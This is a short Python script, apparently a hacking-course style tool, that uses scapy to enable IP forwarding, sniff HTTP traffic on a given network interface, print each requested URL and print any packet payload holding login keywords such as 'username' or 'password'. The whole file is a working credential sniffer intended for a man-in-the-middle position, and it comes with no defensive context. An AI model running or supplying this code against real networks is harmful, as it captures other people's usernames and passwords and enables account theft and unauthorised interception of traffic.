#!/usr/bin/python3
import scapy.all as scapy
from scapy.layers import http
import argparse
import subprocess

def forwarding():
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="Write Interface: wlan/eth0")
    options = parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffedPacket)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def sniffedPacket(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP-Request >> " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n[+++] Username/password >> " + login_info + "\n")

forwarding()
options = get_arguments()
sniff(options.interface)
